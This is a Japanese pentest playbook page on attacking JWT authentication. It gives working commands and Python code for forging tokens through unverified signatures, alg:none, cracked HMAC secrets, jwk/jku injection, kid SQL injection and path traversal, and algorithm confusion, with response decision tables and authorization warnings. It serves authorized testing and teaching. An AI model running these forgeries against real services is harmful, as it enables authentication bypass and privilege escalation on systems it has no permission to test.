# JWT 操作・署名バイパス攻撃

> **スコープ**: JWT (RFC 7519 / JWS) で実装された認証セッションのバイパス・偽造手法を扱う。Bearer トークンを既に入手済み（ログイン後 / レスポンス傍受 / Cookie 取得）の前提で、(1) 署名検証ロジックの実装ミス と (2) 鍵管理の実装ミス を突く。トークンの入手・偵察そのものは `../../01_Reconnaissance/Web_Enumeration.md`。JWE（暗号化 JWT）は本ファイルスコープ外。

## 着火条件

以下のいずれかに該当する場合:

- Authorization ヘッダーに `Bearer eyJ...` 形式のトークンが存在する
- Cookie / localStorage / sessionStorage に `eyJ` で始まる値がある（Base64URL エンコードされた JSON の先頭特徴）
- API レスポンス・JS ファイル・graphql レスポンス等に JWT 形式の文字列が露出している
- ログイン後のセッション管理に JWT を使っていることがソース・ヘッダーから確認できる

## 環境前提

- 実行環境: テスター端末
- 必要なツール:
  - `jwt_tool`（要インストール: `git clone https://github.com/ticarpi/jwt_tool && pip3 install termcolor cprint pycryptodomex requests`、ペネトレ用 Linux ディストリ標準非搭載）
  - `hashcat`（ペネトレ用 Linux ディストリ標準搭載、mode 16500 で JWT 対応）
  - `john`（ペネトレ用 Linux ディストリ標準搭載、`--format=HMAC-SHA256` で JWT 対応）
  - `python3` + `PyJWT` + `cryptography`（`pip3 install pyjwt cryptography`、手動操作・PEM 操作用）
  - `openssl`（ペネトレ用 Linux ディストリ標準搭載、鍵ペア生成・TLS 証明書からの公開鍵抽出用）
  - Burp Suite + JWT Editor 拡張（要インストール / Community でも JWT Editor 拡張は利用可能）
  - `sig2n`（要インストール: `docker pull portswigger/sig2n`、§8.2 で公開鍵が直接入手できない場合に使う）
- 外部リソース依存: `sig2n` の docker image 取得時のみインターネット必須。それ以外は `PyJWT` だけで偽造・署名は完結する

## 先に確認すること

1. JWT 構造が `eyJ.eyJ.署名` の **3 パーツ**に分かれているか（2 パーツしかない場合は既に署名なし運用）
2. ヘッダー `alg` の値（`HS*` / `RS*` / `ES*` / `none`）→ 攻撃パターンの選択に直結
3. ヘッダー `kid` / `jku` / `x5u` / `jwk` の有無 → 追加攻撃面の有無
4. ペイロードの権限関連フィールド（`role` / `admin` / `isAdmin` / `scope` / `groups` / `sub`）→ 書き換え標的の同定
5. 同じユーザーで再ログインしたときに **同じ署名が出るか**（決定的なら HMAC + 弱鍵の可能性が高い、毎回異なるなら `iat` / `nonce` が混ざっている）

**攻撃者の思考トレース:** JWT は「サーバ側に状態を持たないセッション」として設計されているため、署名さえ通れば中身を自由に書き換えられる。攻撃軸は (1) **署名検証ロジックの実装ミス**（未検証 / `none` 受理 / 弱鍵）と (2) **鍵管理の実装ミス**（攻撃者制御鍵を信頼する `jwk` / `jku` / `kid`、対称鍵と非対称鍵の混乱）。Basic な実装ミスから順に試し、刺さらなければ鍵管理側に移る流れになる。

---

## 1. JWT のデコードと構造確認

**事前準備（必須）:** 対象アプリにログインし、Authorization ヘッダー / Cookie / localStorage / レスポンスから JWT を取得しておく。

**コマンド:**

```bash
# [Attacker] 手動デコード（オフラインでも実施可・パディング欠落の補正付き）
echo "[JWT_TOKEN]" | cut -d'.' -f1 | base64 -d 2>/dev/null | python3 -m json.tool
echo "[JWT_TOKEN]" | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# [Attacker] jwt_tool で一括（構造・クレーム・既知の脆弱性チェックまで自動）
python3 jwt_tool.py [JWT_TOKEN]
```

```
# 出力例（ヘッダー）
{"alg": "HS256", "typ": "JWT"}

# 出力例（ペイロード）
{"sub": "[USER_ID]", "role": "user", "iat": 1700000000, "exp": 1700086400}
```

**観測される出力 → 次のアクション:**

| ヘッダー / ペイロードの内容 | 示唆 | 次のアクション |
|---|---|---|
| `"alg": "HS256"` / `"HS384"` / `"HS512"` | HMAC + 共通鍵 | §4 弱い秘密鍵ブルートフォース |
| `"alg": "RS256"` / `"RS384"` / `"ES*"` | 非対称鍵署名 | §5 jwk / §6 jku / §8 Algorithm Confusion |
| `"alg": "none"` | 既に署名なし運用 | §3 alg:none を直接適用 |
| `"kid": ...` が存在 | Key ID 機構あり | §7 kid インジェクション（SQLi / Path Traversal） |
| `"jku": "https://..."` / `"x5u": "https://..."` が存在 | 鍵 URL を JWT 自身が指定 | §6 jku / x5u 差し替え |
| `"jwk": {...}` が存在 / 受理される | 公開鍵が JWT 自身に埋め込まれる | §5 jwk インジェクション |
| ペイロードに `role` / `admin` / `isAdmin` / `scope` / `groups` | 書き換え標的が明確 | §2 〜 §8 のいずれかで偽造後に該当フィールド変更 |
| ペイロードに `exp` / `iss` / `aud` のみ、`role` 系なし | 権限がサーバ側 DB から引かれている可能性 | §9 Claims 検証不備や `IDOR.md` 経路へ |
| ヘッダーが `"typ": "JWE"` | JWE（暗号化 JWT）・本ファイルスコープ外 | 別経路（鍵交換攻撃・JWE 固有 bug）を検討 |

**注意:** JWT は Base64**URL** エンコード（`+`→`-`、`/`→`_`、パディング `=` なし）。`base64 -d` が失敗するときは下記の Python ワンライナーで補正する:

```bash
# [Attacker] パディング自動補正付きの Base64URL デコード
python3 -c "import base64,sys; s=sys.argv[1]; print(base64.urlsafe_b64decode(s + '=='*((4-len(s)%4)%4)))" '[VALUE]'
```

---

## 2. 未検証署名（Accepting Arbitrary Signatures）

**前提:** サーバが署名を **完全にスキップ**している実装ミスを狙う。`jwt.decode()` だけ呼んで `jwt.verify()` を呼び忘れている / 検証例外を握り潰している実装等で成立。`alg:none` とは別系で、`alg` は元のままにして署名部だけをデタラメに書き換える。

**コマンド:**

```python
# [Attacker] alg はそのまま・署名だけ完全デタラメ
import base64, json

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header  = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
payload = b64url(json.dumps({"sub": "[USER_ID]", "role": "admin"}).encode())
token   = f"{header}.{payload}.invalid_signature_chars_here"

print(token)
```

```bash
# [Attacker] jwt_tool 経由（-T はインタラクティブ tampering モード）
python3 jwt_tool.py [JWT_TOKEN] -T
# ペイロードのみ書き換え、署名部は元のままで再送信
```

**観測される出力 → 次のアクション:**

| サーバの応答 | 示唆 | 次のアクション |
|---|---|---|
| 200 OK + 改ざんしたロールの内容が返る | 署名が全く検証されていない | 権限関連フィールド書き換えて目的達成 |
| 401 / 403 | 何らかの検証は行われている | §3 alg:none / §4 弱い HMAC へ進む |
| 500 / トークン解析エラー | デコードは通るがペイロード処理側で例外 | ペイロードスキーマを元 token に合わせて再構成 |

**注意:** **最 Basic なので必ず最初に試す**。PortSwigger Web Security Academy では "Authentication bypass via unverified signature" として最初の Lab に出題される。`alg:none` と挙動が似るが、こちらは `alg` を一切触らない点が違う。

---

## 3. alg:none 攻撃（Accepting Tokens With No Signature）

**前提:** サーバが `alg: none`（署名なし）を受け入れる実装ミスがある場合に成立。JWT 仕様 (RFC 7519) では `none` は許容されているが、本番では拒否すべきもの。

**コマンド:**

```bash
# [Attacker] jwt_tool で alg:none トークン生成
python3 jwt_tool.py [JWT_TOKEN] -X a
# -X a : alg:none exploit。ヘッダーを {"alg":"none","typ":"JWT"} に書き換え、署名部を空にする
```

```python
# [Attacker] 手動生成
import base64, json

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header  = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
payload = b64url(json.dumps({"sub": "[USER_ID]", "role": "admin"}).encode())
token   = f"{header}.{payload}."   # 署名部を空にする

print(token)
```

**観測される出力 → 次のアクション:**

| サーバの応答 | 示唆 | 次のアクション |
|---|---|---|
| 200 OK + 昇格したロールでアクセス成立 | `alg:none` 受理 | 権限関連フィールド書き換えて目的達成 |
| 401 with "Algorithm not allowed" | `none` が明示的に拒否 | 大文字小文字バリエーション（`None` / `NONE` / `nOnE`）を試す |
| 401 with "Invalid signature" | 署名検証は行われている | §4 HMAC ブルートフォース or §5 以降の鍵管理系へ |
| 大文字小文字バリエーションで挙動が変わる | 独自実装で case-sensitive な比較 | 効くバリエーションを採用 |

**注意:** 多くの新しめのライブラリは「秘密鍵を渡しているのに `alg:none` を許す」のは弾くようになっているが、独自実装・古いライブラリ・カスタム middleware ではまだ残っている。

---

## 4. 弱い秘密鍵ブルートフォース（HS256 / HS384 / HS512）

**前提:** `alg` が HS 系（HMAC）のとき、使用されている秘密鍵が推測可能（辞書語・短い文字列・チュートリアル流用 sample key 等）な場合に成立。

**事前準備（必須）:** JWT をそのままファイルに保存する（改行・スペースなし）。

**コマンド:**

```bash
# [Attacker] hashcat (mode 16500 = JWT)
echo -n "[JWT_TOKEN]" > /tmp/jwt.txt
hashcat -a 0 -m 16500 /tmp/jwt.txt /usr/share/wordlists/rockyou.txt
hashcat -a 0 -m 16500 /tmp/jwt.txt [WORDLIST_PATH]    # カスタム辞書

# [Attacker] john でも可
john --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 /tmp/jwt.txt

# [Attacker] jwt_tool 経由（小規模辞書向け）
python3 jwt_tool.py [JWT_TOKEN] -C -d [WORDLIST_PATH]
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `Status: Cracked` + 秘密鍵文字列が返る | 弱鍵成功 | 下記コードで任意ペイロードで再署名 → 認証通過 |
| 辞書を全て消費して未ヒット | 強いランダム鍵 | §5 以降の鍵管理系に切替 |
| 開始直後に `Exhausted` | 辞書ファイルが空 / 行数不足 | `wc -l [WORDLIST]` で行数確認、別辞書 |
| クラックが極端に遅い | hashcat の hash format 不整合 | `-m 16500` 確認、JWT を `echo -n` で改行なし保存し直す |

**鍵が判明したら任意のペイロードで再署名:**

```python
# [Attacker]
import jwt   # pip3 install pyjwt

token = jwt.encode(
    {"sub": "[USER_ID]", "role": "admin"},
    "[CRACKED_SECRET]",
    algorithm="HS256"
)
print(token)
```

**注意:** `secret` / `password` / `your-256-bit-secret` 等の sample key・チュートリアル流用鍵は短時間でヒットする。**辞書攻撃前に sample key 専用リスト**（例: `jwt-secrets/jwt.secrets.list` のような well-known secrets まとめ）を先に試すと効率が良い。

---

## 5. jwk ヘッダーインジェクション（Injecting Self-Signed JWTs via the jwk Parameter）

**前提:** JWT ヘッダーの `jwk` フィールドに埋め込まれた公開鍵をサーバがそのまま検証に使う実装の場合に成立。`alg` が RS 系（RS256 等）のときに有効。

**コマンド:**

```bash
# [Attacker] jwt_tool が鍵ペア生成 → jwk フィールドへ公開鍵埋め込み → 秘密鍵で署名 まで自動
python3 jwt_tool.py [JWT_TOKEN] -X i
# -X i : inject self-signed jwk
```

**観測される出力 → 次のアクション:**

| サーバの応答 | 示唆 | 次のアクション |
|---|---|---|
| 200 OK + 昇格成功 | `jwk` 受理 | 権限フィールド書き換えて目的達成 |
| 401 "Invalid signature" | `jwk` が無視されている / 別の鍵で検証されている | §6 jku（外部 URL 経由）に切替 |
| 500 / "Malformed JWK" | jwk 構造の問題 | jwt_tool の出力 token を Burp で確認、`kty` / `n` / `e` の欠落を補修 |

**注意:** Burp Suite の JWT Editor 拡張でも同等の操作が可能（"Attack" → "Embedded JWK"）。jwt_tool の `-X i` は自動化向き、Burp は手動調整向き。

---

## 6. jku / x5u URL 差し替え（Injecting Self-Signed JWTs via the jku Parameter）

**前提:** JWT ヘッダーに `jku`（JWK Set URL）または `x5u`（X.509 証明書 URL）フィールドがあり、サーバがその URL から検証用公開鍵を取得する実装の場合に成立。

**事前準備（必須）:**

1. テスター端末から到達可能な外部 URL に攻撃者用 JWKS を公開できること（`python3 -m http.server` 等）
2. リスナー起動方法と到達可能 IP の確認は `../../06_Concepts/Reverse_Shell.md`（攻撃側の準備①②）を参照

**コマンド:**

```bash
# [Attacker] 攻撃者用 RSA 鍵ペア生成
openssl genrsa -out /tmp/attacker_priv.pem 2048
openssl rsa -in /tmp/attacker_priv.pem -pubout -out /tmp/attacker_pub.pem

# [Attacker] jwt_tool で JWKS 生成 + 攻撃者鍵での署名 + jku の差し替え
python3 jwt_tool.py [JWT_TOKEN] -X s
# -X s : スプーフィング用 JWKS と署名済み token を出力。jku を指定 URL に書き換えるテンプレも出る

# [Attacker] 生成された JWKS を HTTP サーバで公開（攻撃者側）
python3 -m http.server 8080 --directory [JWKS_DIR]
```

**観測される出力 → 次のアクション:**

| サーバの応答 | 示唆 | 次のアクション |
|---|---|---|
| 200 OK + 昇格成功 | 任意 URL からの `jku` 受理 | 権限フィールド書き換えて目的達成 |
| 401 + 攻撃者側 HTTP サーバに GET が来る | サーバが JWKS を fetch しに来ている（同一オリジン制約等で拒否） | URL parsing bug を試す（`https://[VICTIM]@[ATTACKER]/jwks.json` の userinfo 経由 / `https://[VICTIM]#@[ATTACKER]/` のフラグメント経由 / Path Traversal `https://[VICTIM]/../[ATTACKER]/`） |
| 401 即応答 + 攻撃者側 HTTP サーバにアクセスなし | サーバが `jku` を fetch していない | `x5u` の有無も確認、なければ §5 jwk へ |
| `[ATTACKER_HTTP_SERVER]` のログに GET /jwks.json が記録 | サーバが取得しに来ている | 何度かリクエストして JWKS キャッシュの有無も観察 |

**注意:** サーバが JWKS をキャッシュする実装の場合、初回リクエストの取得分が一定期間使われる。**攻撃者用 JWKS を先に取得させてから改ざんトークンを送る順序**が重要。キャッシュ期間切れ後の再取得タイミングも考慮する。

---

## 7. kid パラメータインジェクション（Injecting Self-Signed JWTs via the kid Parameter）

**前提:** JWT ヘッダーの `kid`（Key ID）フィールドをサーバが SQL クエリ / ファイルパス / その他外部リソースの構築に使っている場合に成立。

### 7.1 kid SQL インジェクション

サーバが `SELECT secret FROM keys WHERE id='[KID]'` のようなクエリで鍵を取得する実装で成立。

**コマンド:**

```bash
# [Attacker] jwt_tool インタラクティブモードで kid フィールドを SQL ペイロードに書き換え
python3 jwt_tool.py [JWT_TOKEN] -T
# kid フィールドを以下に置き換え:
#   ' UNION SELECT '[ATTACKER_CONTROLLED_SECRET]'--
# その後 -S hs256 -p '[ATTACKER_CONTROLLED_SECRET]' で署名
```

### 7.2 kid パストラバーサル（既知ファイルを秘密鍵化）

サーバが `read(file=kid)` 相当で鍵ファイルを読む実装で成立。`/dev/null` 等の **中身が予測可能なファイル**を指定し、その内容を秘密鍵として HMAC 署名する。

**コマンド:**

```bash
# [Attacker] kid に "/dev/null" 相当のパストラバーサルを指定し、空文字列で HS256 署名
python3 -c "
import jwt
header = {'alg': 'HS256', 'typ': 'JWT', 'kid': '../../../../../../dev/null'}
token = jwt.encode({'sub': '[USER_ID]', 'role': 'admin'}, '', algorithm='HS256', headers=header)
print(token)
"
```

中身予測しやすいファイル候補:

- `/dev/null` → 空文字列（最も使いやすい）
- `/proc/sys/kernel/random/boot_id` → boot 後変化しない固定文字列（事前に同経路で読めることが必要）

**観測される出力 → 次のアクション:**

| サーバの応答 | 示唆 | 次のアクション |
|---|---|---|
| 200 OK + 昇格成功 | kid 経由インジェクション成立 | 権限フィールド書き換えて目的達成 |
| 401 "Invalid signature" | kid から鍵取得が成立していない / 別パスへの fallback | パストラバーサル深度を変える、別ファイル試行 |
| 500 / DB error メッセージ | kid SQL インジェクション可能性大 | エラーメッセージから DBMS 特定 → `SQLi.md` の DBMS 別ペイロード |
| 応答時間に差（200ms vs 1500ms） | kid がブラインド SQLi に使われている | 時間ベース SQLi ペイロードで列挙 |

**注意:** kid のサニタイズ実装は様々（正規表現で英数字のみ制限・length 制限・特殊文字エスケープ）。**ペイロードを段階的に増やして拒否されるパターンを観察**するのが定石。

---

## 8. Algorithm Confusion 攻撃（RS256 → HS256）

**前提:** サーバが RS256 で署名を発行しているが、検証側で `alg` ヘッダーを信頼してアルゴリズムを切り替えてしまう実装ミスがある場合に成立。**サーバの RSA 公開鍵**を入手し、それを **HS256 の HMAC 共通鍵として使う**ことで、正規署名付きトークンを偽造できる。

### 8.1 公開鍵が直接入手できる場合（jwks.json 公開 / TLS 証明書）

**コマンド:**

```bash
# [Attacker] よくある JWKS 公開エンドポイント
curl -s https://[TARGET_HOST]/.well-known/jwks.json
curl -s https://[TARGET_HOST]/oauth/jwks
curl -s https://[TARGET_HOST]/auth/jwks

# [Attacker] TLS 証明書から公開鍵を抽出（外部 IdP を使っていない自前実装の場合）
openssl s_client -connect [TARGET_HOST]:443 2>/dev/null | openssl x509 -pubkey -noout > /tmp/pubkey.pem
```

```python
# [Attacker] 公開鍵を HS256 の secret として再署名
import jwt

with open("/tmp/pubkey.pem", "rb") as f:
    pubkey = f.read()

token = jwt.encode(
    {"sub": "[USER_ID]", "role": "admin"},
    pubkey,
    algorithm="HS256"
)
print(token)
```

```bash
# [Attacker] jwt_tool 版（公開鍵ファイル指定）
python3 jwt_tool.py [JWT_TOKEN] -X k -pk /tmp/pubkey.pem
```

### 8.2 公開鍵が入手できない場合（既存トークン 2 つから n を導出）

**前提:** JWKS が非公開かつ TLS 証明書も別系統。同じ鍵で署名された **異なる payload の JWT を 2 つ**入手できる場合に成立（既存セッション + 他ユーザーログインで再ログイン等）。

**コマンド:**

```bash
# [Attacker] sig2n（PortSwigger 公式 Docker イメージ）で 2 トークンから RSA n 候補を導出
docker run --rm -it portswigger/sig2n [TOKEN_1] [TOKEN_2]
# 出力: 候補となる n 値 + PEM 形式の公開鍵 + 既に署名済みの偽造 JWT
# 候補は通常 2 件出る（どちらが正しい n かは実 token で試して特定）
```

```bash
# [Attacker] 出力された PEM 鍵を Burp JWT Editor の "New Symmetric Key" 機能で
#            Base64 化して k パラメータに貼り付け、HS256 で再署名
# 手動経路でも可能だが PEM の 1 バイトでも違うと HMAC 結果がずれるため、Burp 拡張経由が安全
```

**観測される出力 → 次のアクション:**

| サーバの応答 | 示唆 | 次のアクション |
|---|---|---|
| 200 OK + 昇格成功 | algorithm confusion 成立 | 権限フィールド書き換えて目的達成 |
| 401 "Invalid signature" | `alg` ヘッダーがホワイトリスト化されている / 鍵タイプ別に管理 | §5 jwk / §6 jku / §7 kid へ戻る |
| 401 "Invalid algorithm" | RS256 と HS256 で検証経路が完全分離 | 8.2 sig2n でも刺さらない、別経路へ |
| 500 / PEM parsing error | PEM 形式の改行 / X.509 ヘッダー違い | 鍵を `cat -A` で確認、改行を `\n` で揃える |
| sig2n 出力の 2 候補両方で 401 | n 導出失敗 / 想定外の alg 検証 | 別の 2 トークンペアで再試行（`iat` のみ異なるペアが安定） |

**注意:** PyJWT v2.x は `algorithm='HS256'` に PEM 公開鍵を直接渡すと TypeError を出す（型チェックで弾く）。`cryptography` ライブラリの `load_pem_public_key` で読み込み後、`.public_bytes()` で bytes にして渡す。または PyJWT v1.x にダウングレード。**Burp JWT Editor 拡張は内部で同等の処理を自動化**しているため、手動コードで詰まったら拡張を使う方が早い。PEM の表現差（X.509 SubjectPublicKeyInfo vs PKCS#1 RSAPublicKey）でも HMAC 結果が変わるため、サーバ側が使う形式と完全一致させる必要がある。

---

## 9. Claims 検証の不備（exp / iss / aud / nbf）

**前提:** §2 〜 §8 の署名関連攻撃が全て失敗した場合に、**署名は適切に検証されているがクレーム検証が抜けている**実装ミスを狙う。単独では権限昇格には直結しないが、トークンの長期流用や別テナント token 流用の起点になる。

**コマンド:**

```python
# [Attacker] 期限切れ token をそのまま使い回せるか
import jwt
payload = jwt.decode("[EXPIRED_JWT_TOKEN]", options={"verify_signature": False})
print(payload['exp'])   # 過去時刻のはず
# そのままサーバに送信して 200 が返れば exp 検証なし
```

```bash
# [Attacker] jwt_tool でクレーム検証バイパスを一括チェック
python3 jwt_tool.py [JWT_TOKEN] -M at \
  -t https://[TARGET_HOST]/[PROTECTED_ENDPOINT] \
  -rh "Authorization: Bearer [JWT_TOKEN]"
# -M at : all tests モード（exp / nbf / iss / aud / kid / 各種 alg 攻撃を順次実行）
```

**観測される出力 → 次のアクション:**

| サーバの応答 | 示唆 | 次のアクション |
|---|---|---|
| 期限切れトークンで 200 | `exp` 未検証 | テスト期間中はトークンが切れない・長期不正アクセスの finding として記録 |
| `iss` / `aud` 書き換えても 200 | `iss` / `aud` 未検証 | マルチテナント環境では別テナント token 流用可能性、`IDOR.md` と組み合わせ |
| `nbf` (Not Before) が未来時刻でも 200 | 時刻関連検証なし | 同上、後刻トークン用意の負荷を下げられる |

**注意:** Claims 検証の不備単体では権限昇格に直結しないことが多いが、**トークン使い回しの長期化**や**別ユーザー / 別テナント token の流用**で他攻撃の起点になる。`exp` 未検証は監査ログ上の証跡（テスト期間外のトークン使用）として強力。

---

## 刺さらなかったとき（全体）

| 状況 | 推定原因 | 代替手段 |
|---|---|---|
| §2 未検証署名でも 200 が返らない | 何らかの検証は行われている | §3 alg:none / §4 弱い HMAC へ |
| §3 alg:none で 401 が返る | `none` を明示的に拒否 | §4 弱鍵ブルートフォース、以降の §5-§8 へ |
| §4 HMAC ブルートフォースで全辞書を消費 | ランダム生成された強鍵 | §5 jwk / §6 jku / §7 kid / §8 algorithm confusion へ |
| §5 jwk で 401 | ヘッダー内の鍵が無視されている | §6 jku（外部 URL 経由）に切替 |
| §6 jku 差し替えで攻撃者 HTTP サーバへのアクセスログがない | サーバが `jku` を fetch していない | §5 jwk または §7 kid へ |
| §7 kid SQLi も path traversal も無反応 | kid に対するサニタイズが堅い | §8 algorithm confusion へ |
| §8 で 401 | `alg` ホワイトリスト化済み | §9 claims 検証 / トークン以外の経路（`IDOR.md` / `SSRF.md` 等） |
| 全パターン失敗 | 適切に実装されたライブラリ + 適切な設定 | JWT 以外の認証経路（パスワードリセット / OAuth → `OAuth_Attacks.md` / SAML / SSO 連携）に攻撃面を移す |

## 注意点・落とし穴

> **[HIGH IMPACT]** §2 〜 §8 の偽造トークンを使った権限昇格は以下の理由で本番では事前合意必須:
> - [x] **認証バイパスに該当**（権限境界の侵害）
> - [ ] 持続化に該当
> - [ ] 不可逆な設定変更を含む
> - [x] SIEM / EDR で確実に検知される（WAF 側で `alg:none` / 異常な header field のブロック、認証ログの異常ロール付与アラート、`jku` 外部 fetch ログ）
>
> 実施可否は事前合意で明示確認すること。**偽造トークンで作成・変更したデータは原状回復必須**。演習環境（HTB / OSCP 等）では制約なし。

> **個別ブロック固有の注意は各 §N ブロック内の「注意:」を参照。** 本セクションは複数ブロック横断の高影響警告のみを置く。

### 本番での前提

- **事前合意の要否**: ★（§1 デコードのみは技術的判断で実施可）/ ★★★（書面承認必須 — §2 〜 §8 の認証バイパスを伴う偽造）/ ★★（口頭確認可 — §9 claims 検証は finding 報告レベル）
- **想定される SIEM / EDR 検知**: WAF ルール（`alg:none` / 異常なヘッダーフィールドのブロック）/ 認証ログの異常ロール付与アラート / `jku` 外部 fetch ログ / kid SQL エラーアラート / 短時間での大量署名検証失敗
- **業務影響リスク**: なし（§1 偵察は影響なし）。§2 〜 §8 で認証バイパス成功後の操作（管理画面操作・他ユーザーデータ書き換え）の影響は操作内容による
- **原状回復必須項目**: ✅ 偽造トークンで作成・変更したデータの復元 / ✅ §6 で起動した攻撃者 JWKS HTTP サーバの停止 / ✅ §6 / §8 で生成した攻撃者鍵ペアの破棄
- **取得情報の取扱**: 取得した秘密鍵 / クラックした HMAC secret は暗号化保管・テスト完了時破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：Web 列挙で JWT ベースの認証を確認 → `../../01_Reconnaissance/Web_Enumeration.md`
- 前：SSRF でサーバ内部の JWKS エンドポイントを確認 → `SSRF.md`
- 後：認証バイパス成功後の API エンドポイント列挙・横展開 → `IDOR.md`
- 後：偽造トークンで到達した管理機能経由のコマンド実行 → `Command_Injection.md`
- 後：OAuth/OIDC の id_token 検証バイパス（JWT 攻撃の応用） → `OAuth_Attacks.md`
- 関連：セッション Cookie 窃取（JWT が Cookie に格納されている場合） → `XSS.md`
- 関連：hashcat 詳細（mode 16500） → `../../05_Tools_Reference/Hashcat.md`
- 関連：§6 jku 差し替えでのリスナー準備 → `../../06_Concepts/Reverse_Shell.md`（攻撃側の準備①②）
